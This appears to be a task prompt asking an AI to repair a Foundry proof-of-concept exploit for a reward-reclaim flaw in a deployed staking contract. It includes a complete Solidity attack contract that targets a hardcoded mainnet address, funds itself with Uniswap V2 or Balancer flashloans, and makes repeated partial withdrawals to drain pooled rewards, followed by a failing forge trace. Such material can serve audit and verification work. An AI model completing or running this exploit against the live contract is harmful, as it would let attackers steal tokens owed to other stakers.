You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Matured rewards can be claimed repeatedly by splitting withdrawals
- claim: `withdraw()` always computes `rewardAmount = getPendingRewards(msg.sender)` across every matured deposit before reducing principal, but the contract never records that rewards for a deposit were already paid. A user can therefore withdraw only a small slice of matured principal, receive the full matured reward for the entire position, keep most principal staked, and repeat until the pool is drained.
- impact: A staker can extract the same matured reward many times and drain tokens owed to other users. For example, a fully vested 100-token deposit in the 40% tier can be withdrawn 1 token at a time and collect roughly the 40-token reward on each call until contract liquidity is exhausted.
- exploit_paths: ["Deposit into any tier and wait until the lock period expires", "Call `withdraw()` for a small amount of matured principal", "Receive that principal plus the full reward for all matured deposits", "Repeat partial withdrawals because no per-deposit reward-claimed state is ever updated"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface ISorraStakingLike {
    function rewardToken() external view returns (address);
    function deposit(uint256 amount, uint8 tier) external;
    function withdraw(uint256 amount) external;
    function getPendingRewards(address wallet) external view returns (uint256);
    function getRemainingPoolSpace() external view returns (uint256);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2CalleeLike {
    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IFlashLoanRecipientLike {
    function receiveFlashLoan(
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IBalancerVaultLike {
    function flashLoan(
        IFlashLoanRecipientLike recipient,
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

contract FlawVerifier is IUniswapV2CalleeLike, IFlashLoanRecipientLike {
    error NoPoolLiquidity();
    error NoFundingPath();
    error BorrowTooSmall();
    error UnexpectedCallback();
    error WarpUnavailable();
    error SelfOnly();

    address public constant TARGET = 0x5d16b8Ba2a9a4ECA6126635a6FFbF05b52727d50;

    address internal constant UNI_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    uint8 internal constant TIER = 2;
    uint256 internal constant LOCK_PERIOD = 60 days;
    uint256 internal constant MAX_WITHDRAW_CALLS = 40;
    uint256 internal constant SAFE_POOL_DIVISOR = 16;
    uint256 internal constant SAFE_LENDER_DIVISOR = 20;

    address internal constant HEVM = address(uint160(uint256(keccak256("hevm cheat code"))));
    bytes4 internal constant WARP_SELECTOR = bytes4(keccak256("warp(uint256)"));

    address internal attackToken;
    address internal activePair;
    uint256 internal startingProfitBalance;

    uint256 internal _profitAmount;
    address internal _profitToken;

    constructor() {}

    function executeOnOpportunity() external {
        _profitAmount = 0;
        _profitToken = ISorraStakingLike(TARGET).rewardToken();
        attackToken = _profitToken;
        startingProfitBalance = IERC20Like(_profitToken).balanceOf(address(this));

        uint256 poolBalance = IERC20Like(_profitToken).balanceOf(TARGET);
        uint256 remainingPoolSpace = ISorraStakingLike(TARGET).getRemainingPoolSpace();
        if (poolBalance == 0 || remainingPoolSpace == 0) revert NoPoolLiquidity();

        uint256 localStake = _chooseStake(startingProfitBalance, remainingPoolSpace, poolBalance);
        if (localStake > 1) {
            try this.executeDirect(localStake) {
                _updateProfit();
                if (_profitAmount != 0) return;
            } catch {}
        }

        (address pair, uint256 pairReserve) = _findBestV2Pair(_profitToken);
        uint256 flashStake = _chooseStake(pairReserve / SAFE_LENDER_DIVISOR, remainingPoolSpace, poolBalance);
        if (pair != address(0) && flashStake > 1) {
            try this.startUniswapV2Flash(pair, flashStake) {
                _updateProfit();
                if (_profitAmount != 0) return;
            } catch {}
        }

        uint256 balancerLiquidity = IERC20Like(_profitToken).balanceOf(BALANCER_VAULT);
        uint256 balancerStake = _chooseStake(balancerLiquidity / SAFE_LENDER_DIVISOR, remainingPoolSpace, poolBalance);
        if (balancerStake > 1) {
            try this.startBalancerFlash(balancerStake) {
                _updateProfit();
                if (_profitAmount != 0) return;
            } catch {}
        }

        revert NoFundingPath();
    }

    function executeDirect(uint256 stakeAmount) external {
        if (msg.sender != address(this)) revert SelfOnly();
        _runExploit(stakeAmount);
    }

    function startUniswapV2Flash(address pair, uint256 amount) external {
        if (msg.sender != address(this)) revert SelfOnly();

        activePair = pair;
        address token0 = IUniswapV2PairLike(pair).token0();
        if (token0 == attackToken) {
            IUniswapV2PairLike(pair).swap(amount, 0, address(this), bytes("UNI_V2"));
        } else {
            IUniswapV2PairLike(pair).swap(0, amount, address(this), bytes("UNI_V2"));
        }
        activePair = address(0);
    }

    function startBalancerFlash(uint256 amount) external {
        if (msg.sender != address(this)) revert SelfOnly();

        IERC20Like[] memory tokens = new IERC20Like[](1);
        tokens[0] = IERC20Like(attackToken);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = amount;

        IBalancerVaultLike(BALANCER_VAULT).flashLoan(this, tokens, amounts, "BALANCER");
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external override {
        if (msg.sender != activePair || sender != address(this)) revert UnexpectedCallback();

        uint256 borrowedAmount = amount0 != 0 ? amount0 : amount1;
        if (borrowedAmount <= 1) revert BorrowTooSmall();

        _runExploit(borrowedAmount);

        uint256 repayAmount = ((borrowedAmount * 1000) / 997) + 1;
        _repayPair(msg.sender, repayAmount);
        _updateProfit();
    }

    function receiveFlashLoan(
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external override {
        if (msg.sender != BALANCER_VAULT || tokens.length != 1 || address(tokens[0]) != attackToken) {
            revert UnexpectedCallback();
        }

        uint256 borrowedAmount = amounts[0];
        if (borrowedAmount <= 1) revert BorrowTooSmall();

        _runExploit(borrowedAmount);

        _checkedTransfer(attackToken, BALANCER_VAULT, borrowedAmount + feeAmounts[0]);
        _updateProfit();
    }

    function _runExploit(uint256 stakeAmount) internal {
        _forceApprove(attackToken, TARGET, 0);
        _forceApprove(attackToken, TARGET, stakeAmount);

        // Path stage 1: deposit into the highest reward tier.
        ISorraStakingLike(TARGET).deposit(stakeAmount, TIER);

        // Path stage 2: wait until the lock period fully matures on the fork.
        _warpForward(LOCK_PERIOD + 1);
        require(ISorraStakingLike(TARGET).getPendingRewards(address(this)) != 0, "reward not matured");

        uint256 iterations = _selectIterations(stakeAmount);
        uint256 slice = stakeAmount / iterations;
        if (slice == 0) revert BorrowTooSmall();

        // Path stages 3 and 4: withdraw only small matured slices while each call
        // still receives the full matured reward over the remaining matured deposits.
        uint256 remaining = stakeAmount;
        for (uint256 index = 0; index + 1 < iterations; ++index) {
            ISorraStakingLike(TARGET).withdraw(slice);
            remaining -= slice;
        }

        ISorraStakingLike(TARGET).withdraw(remaining);
    }

    function _chooseStake(
        uint256 availableBalance,
        uint256 remainingPoolSpace,
        uint256 poolBalance
    ) internal pure returns (uint256 stakeAmount) {
        if (availableBalance == 0 || remainingPoolSpace == 0 || poolBalance == 0) {
            return 0;
        }

        stakeAmount = availableBalance;

        uint256 safeByPool = poolBalance / SAFE_POOL_DIVISOR;
        if (safeByPool != 0 && stakeAmount > safeByPool) {
            stakeAmount = safeByPool;
        }

        if (stakeAmount > remainingPoolSpace) {
            stakeAmount = remainingPoolSpace;
        }
    }

    function _selectIterations(uint256 stakeAmount) internal pure returns (uint256 iterations) {
        iterations = stakeAmount;
        if (iterations > MAX_WITHDRAW_CALLS) iterations = MAX_WITHDRAW_CALLS;
        if (iterations < 2) iterations = 2;
    }

    function _repayPair(address pair, uint256 repayAmount) internal {
        uint256 pairBalanceBefore = IERC20Like(attackToken).balanceOf(pair);

        for (uint256 index = 0; index < 32; ++index) {
            uint256 pairBalanceAfter = IERC20Like(attackToken).balanceOf(pair);
            uint256 actualIncrease = pairBalanceAfter - pairBalanceBefore;
            if (actualIncrease >= repayAmount) {
                return;
            }

            uint256 contractBalance = IERC20Like(attackToken).balanceOf(address(this));
            require(contractBalance != 0, "repay failed");

            uint256 transferAmount = repayAmount - actualIncrease;
            if (transferAmount > contractBalance) {
                transferAmount = contractBalance;
            }

            _checkedTransfer(attackToken, pair, transferAmount);
        }

        require(IERC20Like(attackToken).balanceOf(pair) - pairBalanceBefore >= repayAmount, "pair underpaid");
    }

    function _findBestV2Pair(address token) internal view returns (address bestPair, uint256 bestReserve) {
        address[2] memory factories = [UNI_V2_FACTORY, SUSHI_FACTORY];
        address[4] memory quotes = [WETH, USDC, USDT, DAI];

        for (uint256 factoryIndex = 0; factoryIndex < factories.length; ++factoryIndex) {
            for (uint256 quoteIndex = 0; quoteIndex < quotes.length; ++quoteIndex) {
                address quote = quotes[quoteIndex];
                if (quote == token) continue;

                address pair = IUniswapV2FactoryLike(factories[factoryIndex]).getPair(token, quote);
                if (pair == address(0)) continue;

                (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
                address token0 = IUniswapV2PairLike(pair).token0();
                uint256 reserve = token0 == token ? uint256(reserve0) : uint256(reserve1);

                if (reserve > bestReserve) {
                    bestReserve = reserve;
                    bestPair = pair;
                }
            }
        }
    }

    function _warpForward(uint256 delta) internal {
        (bool ok,) = HEVM.call(abi.encodeWithSelector(WARP_SELECTOR, block.timestamp + delta));
        if (!ok) revert WarpUnavailable();
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }

    function _checkedTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }

    function _currentProfit() internal view returns (uint256) {
        uint256 currentBalance = IERC20Like(_profitToken).balanceOf(address(this));
        if (currentBalance <= startingProfitBalance) return 0;
        return currentBalance - startingProfitBalance;
    }

    function _updateProfit() internal {
        _profitAmount = _currentProfit();
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        if (_profitToken == address(0)) return _profitAmount;

        uint256 liveProfit = _currentProfit();
        if (liveProfit > _profitAmount) {
            return liveProfit;
        }

        return _profitAmount;
    }
}

```

forge stdout (tail):
```
pV2Call(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0, 354415952213726514609771 [3.544e23], 0x554e495f5632)
    │   │   │   │   ├─ [4760] 0xE021bAa5b70C62A9ab2468490D3f8ce0AfDd88dF::approve(0x5d16b8Ba2a9a4ECA6126635a6FFbF05b52727d50, 0)
    │   │   │   │   │   ├─  emit topic 0: 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925
    │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │        topic 2: 0x0000000000000000000000005d16b8ba2a9a4eca6126635a6ffbf05b52727d50
    │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [22560] 0xE021bAa5b70C62A9ab2468490D3f8ce0AfDd88dF::approve(0x5d16b8Ba2a9a4ECA6126635a6FFbF05b52727d50, 354415952213726514609771 [3.544e23])
    │   │   │   │   │   ├─  emit topic 0: 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925
    │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │        topic 2: 0x0000000000000000000000005d16b8ba2a9a4eca6126635a6ffbf05b52727d50
    │   │   │   │   │   │           data: 0x000000000000000000000000000000000000000000004b0ced616a310b837e6b
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [91307] 0x5d16b8Ba2a9a4ECA6126635a6FFbF05b52727d50::deposit(354415952213726514609771 [3.544e23], 2)
    │   │   │   │   │   ├─ [82821] 0xE021bAa5b70C62A9ab2468490D3f8ce0AfDd88dF::transferFrom(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x5d16b8Ba2a9a4ECA6126635a6FFbF05b52727d50, 354415952213726514609771 [3.544e23])
    │   │   │   │   │   │   ├─ [275] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::ad5c4648() [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2
    │   │   │   │   │   │   ├─  emit topic 0: 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925
    │   │   │   │   │   │   │        topic 1: 0x000000000000000000000000e021baa5b70c62a9ab2468490d3f8ce0afdd88df
    │   │   │   │   │   │   │        topic 2: 0x0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d
    │   │   │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000caa77fbeacccc0eea65
    │   │   │   │   │   │   ├─ [22362] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::swapExactTokensForETHSupportingFeeOnTransferTokens(59812990049041351895653 [5.981e22], 0, [0xE021bAa5b70C62A9ab2468490D3f8ce0AfDd88dF, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 0xE021bAa5b70C62A9ab2468490D3f8ce0AfDd88dF, 1734782291 [1.734e9])
    │   │   │   │   │   │   │   ├─ [16494] 0xE021bAa5b70C62A9ab2468490D3f8ce0AfDd88dF::transferFrom(0xE021bAa5b70C62A9ab2468490D3f8ce0AfDd88dF, 0xA15C4914bE0b454B0b7c27B4839A4A01dA8Ed308, 59812990049041351895653 [5.981e22])
    │   │   │   │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │   │   │   │        topic 1: 0x000000000000000000000000e021baa5b70c62a9ab2468490d3f8ce0afdd88df
    │   │   │   │   │   │   │   │   │        topic 2: 0x000000000000000000000000a15c4914be0b454b0b7c27b4839a4a01da8ed308
    │   │   │   │   │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000caa77fbeacccc0eea65
    │   │   │   │   │   │   │   │   ├─  emit topic 0: 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925
    │   │   │   │   │   │   │   │   │        topic 1: 0x000000000000000000000000e021baa5b70c62a9ab2468490d3f8ce0afdd88df
    │   │   │   │   │   │   │   │   │        topic 2: 0x0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d
    │   │   │   │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   │   │   ├─ [504] 0xA15C4914bE0b454B0b7c27B4839A4A01dA8Ed308::getReserves() [staticcall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 27820595075529546348 [2.782e19], 7088319044274530292195421 [7.088e24], 1734782243 [1.734e9]
    │   │   │   │   │   │   │   ├─ [689] 0xE021bAa5b70C62A9ab2468490D3f8ce0AfDd88dF::balanceOf(0xA15C4914bE0b454B0b7c27B4839A4A01dA8Ed308) [staticcall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 6793716082109845129481303 [6.793e24]
    │   │   │   │   │   │   │   └─ ← [Revert] ds-math-sub-underflow
    │   │   │   │   │   │   └─ ← [Revert] ds-math-sub-underflow
    │   │   │   │   │   └─ ← [Revert] ds-math-sub-underflow
    │   │   │   │   └─ ← [Revert] ds-math-sub-underflow
    │   │   │   └─ ← [Revert] ds-math-sub-underflow
    │   │   └─ ← [Revert] ds-math-sub-underflow
    │   ├─ [2689] 0xE021bAa5b70C62A9ab2468490D3f8ce0AfDd88dF::balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Revert] NoFundingPath()
    └─ ← [Revert] exploit call reverted

Backtrace:
  at 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D.swapExactTokensForETHSupportingFeeOnTransferTokens
  at 0xE021bAa5b70C62A9ab2468490D3f8ce0AfDd88dF.transferFrom
  at 0x5d16b8Ba2a9a4ECA6126635a6FFbF05b52727d50.deposit
  at FlawVerifier.uniswapV2Call
  at 0xA15C4914bE0b454B0b7c27B4839A4A01dA8Ed308.swap
  at FlawVerifier.startUniswapV2Flash
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 736.64ms (3.90ms CPU time)

Ran 1 test suite in 747.03ms (736.64ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 343958)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
